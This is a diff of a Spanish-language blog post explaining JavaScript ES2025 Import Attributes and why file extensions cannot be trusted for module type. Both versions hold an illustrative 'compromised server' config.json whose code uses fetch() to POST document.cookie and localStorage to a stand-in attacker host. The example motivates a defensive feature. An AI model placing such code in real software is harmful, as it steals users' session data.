@@ -1,15 +1,14 @@
 ---
 title: "Lo nuevo de JavaScript ES2025: Import Attributes"
-description: Comprendiendo su nueva sintaxis y por qué no podemos fiarnos solo de las extensiones de archivo.
+description: Una nueva forma de hacer que las importaciones de módulos sean más seguras.
 date: 2024-11-22T21:33:25.684Z
-update: 2025-01-22T21:13:59.142Z
+update: 2025-09-12T13:03:04.439Z
 hero: ./js-es2025.svg
 heroAlt: JavaScript ES2025
 og: ./js-es2025.png
 tags:
   - Programación
   - JavaScript
-  - ES2025
   - JSON
 sources:
   - title: JavaScript Import Attributes (ES2025) - Trevor I. Lasn
@@ -20,80 +19,37 @@ sources:
     href: https://github.com/tc39/proposal-import-attributes
 themeColor: "#f0db4f"
 ---
-import { BaselineStatus } from '@/components/BaselineStatus';
+import { BaselineStatus } from "@/components/BaselineStatus";
 
 <BaselineStatus id="json-modules" />
 
-JavaScript incorpora una nueva función que hace que las importaciones de módulos sean más explícitas y seguras. Los **Import Attributes** añaden una forma de pasar metadatos sobre cualquier módulo que estemos importando, ya sea JSON, JavaScript u otros tipos de módulos.
+JavaScript incluyó **Import Attributes**, una característica que te permite declarar explícitamente qué tipo de módulo estás importando. Esta adición aporta mayor seguridad y claridad a las importaciones de módulos, especialmente para JSON y otros módulos que no son de JavaScript.
 
-## ❌ El problema
+## El problema con las extensiones de archivo
 
-En Internet, las extensiones de archivo no indican el contenido de forma fiable. Un servidor puede devolver JavaScript cuando usted espera JSON:
+Al importar módulos en la web, no podemos usar de forma fiable las extensiones de archivo para determinar el tipo de módulo. Un servidor podría enviar código JavaScript incluso cuando se solicita un archivo con extensión `.json`, lo que podría crear riesgos de seguridad:
 
-```js title="main.js"
-// Parece seguro, pero podría ser peligroso ☢️
-import config from './config.json';
-```
-
-```js title="config.json"
-// El servidor podría responder con código ejecutable:
-export default (function () {
-  // Ejecución inesperada de código 💀
-})();
-```
-
-## 💡 La solución: Import Attributes
-
-Los Import Attributes crean un contrato entre el código y el tiempo de ejecución. Declaras explícitamente qué tipo de módulo esperas:
-
-```js
-// Requerir JSON explícitamente
-import config from './config.json' with { type: 'json' };
-
-// O especificar JavaScript
-import module from './module.js' with { type: 'javascript' };
-
-// También funciona con importaciones dinámicas
-const data = await import('./config.json', {
-  with: { type: 'json' }
-});
-```
-
-La sintaxis funciona de forma coherente en diferentes contextos de módulos:
-
-```js
-// Re-exportación con atributos
-export { data } from './data.json' with { type: 'json' };
-
-// Instanciación de Web Worker
-new Worker('processor.wasm', {
-  type: 'module',
-  with: { type: 'webassembly' }
-});
-```
-
-## 💭 ¿Por qué los Import Attributes?
-
-El principal problema es la seguridad. En Internet, las extensiones de archivo no indican el contenido de forma fiable. Una URL que termine en `json` podría en realidad servir JavaScript:
+Lo que esperas recibir:
 
 ```js title="main.js"
-// Carga de la configuración de la API
-import apiConfig from './api-config.json';
+import config from "./config.json";
+```
 
-// Lo que esperas obtener:
+```json title="config.json"
 {
-  "apiKey": "secret-key",
-  "endpoint": "https://api.example.com",
-  "timeout": 5000
+  "accessToken": "secret-key",
+  "refreshToken": "secret-key",
+  "expiresAt": "2125-01-21T21:35:34.607Z"
 }
 ```
 
-```js title="api-config.json"
-// Lo que un servidor comprometido podría enviar en su lugar:
+Lo que un servidor comprometido podría enviar en su lugar:
+
+```js title="config.json"
 export default (function () {
-  // Envía tus claves API a un atacante
-  fetch('https://attacker.com', {
-    method: 'POST',
+  // Envía sus claves API a un atacante
+  fetch("https://attacker.hack", {
+    method: "POST",
     body: JSON.stringify({
       cookies: document.cookie,
       localStorage: window.localStorage
@@ -102,28 +58,58 @@ export default (function () {
 
   // Luego devuelve lo que parece una configuración normal
   return {
-    apiKey: 'secret-key',
-    endpoint: 'https://api.example.com',
-    timeout: 5000
+    accessToken: "secret-key",
+    refreshToken: "secret-key",
+    expiresAt: "2125-01-21T21:35:34.607Z"
   }
 })();
 ```
 
-Los Import Attributes hacen que nuestro sistema de módulos sea más explícito y seguro. Los módulos JSON no pueden ejecutar código, son datos puros. Cuando marcas un módulo con `type: "json"`, estás garantizado que obtendrás datos JSON o un error, nunca código ejecutable.
+## La solución: Import Attributes
 
-El impacto más inmediato se produce en las importaciones JSON, donde la seguridad es crucial:
+Los Import Attributes te permiten declarar explícitamente qué tipo de módulo esperas recibir, creando un contrato que los entornos de JavaScript deben hacer cumplir:
 
-```js
-// Archivos de configuración
-import config from './config.json' with { type: 'json' };
-
-// Configuración dinámica
-const config = await import(
-  `./config.${env}.json`,
-  { with: { type: 'json' } }
-);
+```diff title="main.js"
+- // SIN Import Attributes - potencialmente inseguro
+- import config from "./config.json";
++ // CON Import Attributes - importación segura de JSON
++ import config from "./config.json" with { type: "json" };
 ```
 
-Esta característica crea una base para manejar con seguridad diferentes tipos de módulos en JavaScript. Cuando llegue en 2025, dispondremos de una forma estándar de declarar nuestras expectativas sobre los módulos en todos los entornos JavaScript.
+## ¿Dónde se pueden usar los Import Attributes?
 
-Piensa en ello como si añadieras seguridad de tipos a tus importaciones de módulos, no para los datos dentro de los módulos, sino para los propios módulos.
+La sintaxis funciona de manera consistente en diferentes escenarios de importación:
+
+```js
+// Importaciones regulares
+import config from "./config.json" with { type: "json" };
+
+// Importaciones dinámicas
+const config = await import("./config.json", {
+  with: { type: "json" }
+});
+
+// Re-exportaciones
+export { apiKey } from "./config.json" with { type: "json" };
+
+// Módulos JavaScript
+import module from "./module.js" with { type: "javascript" };
+
+// Web Workers
+new Worker("worker.wasm", {
+  type: "module",
+  with: { type: "webassembly" }
+});
+```
+
+## Beneficios clave
+
+- **Seguridad**: Al importar módulos JSON, el atributo `type: "json"` garantiza que recibirás datos JSON o un error, pero nunca código ejecutable.
+- **Consistencia**: Proporciona una forma estándar de manejar diferentes tipos de módulos en todos los entornos de JavaScript.
+- **Extensibilidad**: Aunque los módulos JSON son el primer caso de uso, la sintaxis está diseñada para admitir futuros tipos de módulos y atributos de metadatos adicionales.
+- **Control de Caché**: Los *hosts* (entornos de ejecución) pueden usar los atributos como parte de su estrategia de caché de módulos, y el comportamiento es definido por cada entorno.
+
+## Aplicaciones prácticas
+
+- **Módulos JSON**: El caso de uso principal de los atributos de importación es cargar módulos JSON de forma fiable. Al especificar `type: "json"`, garantizas que el servidor entregue los datos como JSON y no como código potencialmente malicioso.
+- **Importaciones dinámicas**: Los atributos de importación permiten usar importaciones dinámicas (`await import()`) y tener control sobre el tipo de módulo, lo que las hace más flexibles para diversos casos de uso.
